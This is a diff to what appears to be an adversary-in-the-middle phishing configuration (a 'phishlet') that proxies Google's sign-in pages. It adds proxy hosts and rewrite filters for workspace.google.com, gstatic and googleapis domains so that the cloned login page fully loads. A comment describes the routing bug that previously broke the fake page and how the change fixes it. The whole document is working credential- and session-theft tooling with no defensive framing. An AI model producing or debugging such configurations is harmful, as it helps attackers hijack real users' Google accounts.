@@ -22,6 +22,16 @@ proxy_hosts:
   - {phish_sub: 'clients4', orig_sub: 'clients4', domain: 'google.com', session: false, is_landing: false}
   - {phish_sub: 'clients5', orig_sub: 'clients4', domain: 'google.com', session: false, is_landing: false}
   - {phish_sub: 'clients6', orig_sub: 'clients4', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'workspace', orig_sub: 'workspace', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'googleapis.com', session: false, is_landing: false}
+  # www.gstatic.com serves the sign-in app's JS bundles. It MUST have its own
+  # phish_sub: first-match host routing sends every www.go.* request to the
+  # first www.* entry (www.google.com), so the bundle was forwarded to
+  # www.google.com (404) instead of www.gstatic.com - the whole page app never
+  # loads and every button stays dead.
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false}
 sub_filters:
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'play.google.com', replace: 'play.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
@@ -32,6 +42,9 @@ sub_filters:
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'workspace.google.com', replace: 'workspace.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.youtube.com', replace: 'accounts.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'myaccount.{domain}', replace: 'myaccount.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'workspace.google.com', replace: 'workspace.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'ssl.gstatic.com', replace: 'ssl.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'content.googleapis.com', replace: 'content.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'ssl.gstatic.com', replace: 'ssl.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'play.google.com', replace: 'play.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
